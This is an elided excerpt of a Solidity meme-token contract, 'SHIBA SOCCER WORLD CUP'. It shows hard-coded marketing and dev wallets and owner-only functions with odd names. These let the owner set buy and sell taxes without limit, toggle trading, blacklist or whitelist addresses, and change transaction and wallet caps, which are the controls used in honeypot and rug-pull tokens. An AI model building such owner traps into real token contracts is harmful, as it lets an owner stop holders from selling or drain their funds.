...
// telegram : https://t.me/ShibaSoccerWorldCup
...
contract SHIBA_SOCCER_WORLD_CUP is Context, IERC20 { 
    ...
    address payable private Wallet_Marketing = payable(0x575966fa1C82D27416d2Aafe7FB8D72f7e3DAd0b); 
    address payable private Wallet_Dev = payable(0x373839da307001D6039281Cb87EC598863165bE8);
    ...
    string private constant _name = "SHIBA SOCCER WORLD CUP"; 
    string private constant _symbol = unicode"SSWC"; 
    ...
    uint256 public _Tax_On_Sell = 1;
     function _Taxes_set(uint256 Buy_Fee, uint256 Sell_Fee) external onlyOwner() {

       _Tax_On_Sell = Sell_Fee;
       _Tax_On_Buy = Buy_Fee;
    }

    uint256 private Percent_Marketing = 97;
    uint256 private Percent_Dev = 2;
    ...
    constructor () {
        ...
        _owner = 0x373839da307001D6039281Cb87EC598863165bE8;
    ...
    function Start_MuterTrick(bool open) external onlyOwner {
        _open = open;
    }
    ...
    */
    ...
    function MuterBLALA(address[] calldata addresses) external onlyOwner {
    ...
    function MuterBLA(address addresses) external onlyOwner {
    ...
    function MuterWL_LP(address addresses) external onlyOwner {
    ...
    function BLIT_rmv(address[] calldata addresses) external onlyOwner {
    ...
    function BLIT_rmve(address addresses) external onlyOwner {
    ...
    function MuterWL_rmv(address addresses) external onlyOwner {
    ...
    function Muter_Buy(uint256 maxTxPercent_x100) external onlyOwner() {
        _maxTxAmount = _tTotal*maxTxPercent_x100/10000;
    }    
    
    // Set the maximum wallet holding (percent of total supply)
     function Muter_Wallet(uint256 maxWallPercent_x100) external onlyOwner() {
